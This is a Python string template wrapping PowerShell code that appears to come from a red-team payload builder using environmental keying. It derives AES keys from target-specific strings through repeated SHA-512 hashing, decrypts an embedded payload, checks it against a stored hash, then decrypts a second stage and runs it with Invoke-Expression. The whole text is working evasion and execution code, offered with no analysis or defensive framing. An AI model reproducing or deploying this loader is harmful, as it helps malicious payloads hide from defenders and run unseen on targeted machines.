buildcode = """
# modified from https://gist.github.com/ctigeek/2a56648b923d198a6e60
function Get-AesManagedObject($key, $IV) {{
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.blocksize = 128
    $aesManaged.KeySize = 256
    if ($IV) {{
        if ($IV.getType().Name -eq "String") {{
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }}
        else {{
            $aesManaged.IV = $IV
        }}
    }}
    if ($key) {{
        if ($key.getType().Name -eq "String") {{
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }}
        else {{
            $aesManaged.Key = $key
        }}
    }}
    $aesManaged
}}

function Get-AesKey() {{
    $aesManaged = Get-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}}

function Get-DecryptedString($key, $encryptedStringWithIV) {{
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    #$bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Get-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    return $unencryptedData
}}

function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
    $sha512 = new-Object System.Security.Cryptography.SHA512Managed
    $end = $payload.Length - $minus_bytes -1
        
    if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{
        return 1
    }} Else {{
        return 0
    }}
}}

function Get-CodeExecution($key, $payload){{
  Write-Host "[*] In code execution function"
	$encryptedString = "{3}"
  $decrypted_loader = Get-DecryptedString $key $encryptedString
	$decoded_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader).Trim([char]0)
  iex $decoded_loader
}}

#build function
function Get-R-Done($lookup_table, $payload_hash, $minus_bytes, $key_combos, $key_iterations){{
	# Iterate through $key_combos
	$key_list = @()
	$another_temp = @()
    foreach ($item in $key_combos){{
      if ($item.GetType().Name -eq "String") {{  
          if ($key_list.count -eq 0){{
              $key_list += $item
          }} else {{
              $another_temp = @()
              foreach ($value in $key_list){{
                  $another_temp += $value + $item
              }}
              $key_list = $another_temp
          }}
      }} elseif ($item.GetType().IsArray){{
            if ($key_list.count -eq 0){{
                foreach ($astring in $item){{
                    $key_list += $astring
                }}
            }} else {{
                 $another_temp = @()
                 foreach ($sub_item in $item){{
                     foreach ($astring in $key_list){{
                         $another_temp += $astring + $sub_item
                     }}
                 }}
                 $key_list = $another_temp
            }}
        }}
    }}
    
	 foreach ($keyvalue in $key_list){{
       Write-Host "[*] Testing keyvalue:" $keyvalue
       $barrier = "=" * 50
       Write-Host $barrier
        $iteration_temp = $key_iterations
        $sha512 = new-Object System.Security.Cryptography.SHA512Managed
        $keyvalue = [system.Text.Encoding]::UTF8.GetBytes($keyvalue.ToLower())
	      while ($iteration_temp -ne 1){{
            $keyvalue = $sha512.ComputeHash($keyvalue)
            $iteration_temp--
        }}
        $keyvalue = $sha512.ComputeHash($keyvalue)
        $keyvalue = [System.Convert]::ToBase64String($keyvalue[0..31])
        Write-Host "[*] Testing key:", $keyvalue
        try {{
        	$payload = Get-DecryptedString $keyvalue $lookup_table
        	$result = Get-CheckHash $payload $payload_hash $minus_bytes
        
        }} Catch {{
        	$result = 0
        }}
        
        if ($result -eq 1){{
            Write-Host "[*] Hashes match"
            Get-CodeExecution $keyvalue $payload
        }}
    }}
}}


{5}


	$lookup_table = "{0}"
	$payload_hash = "{1}"
	$minus_bytes = {2}
	$scan_dir = "{4}"
	$key_combos = @()
	$key_iterations = {7}

	{6}

"""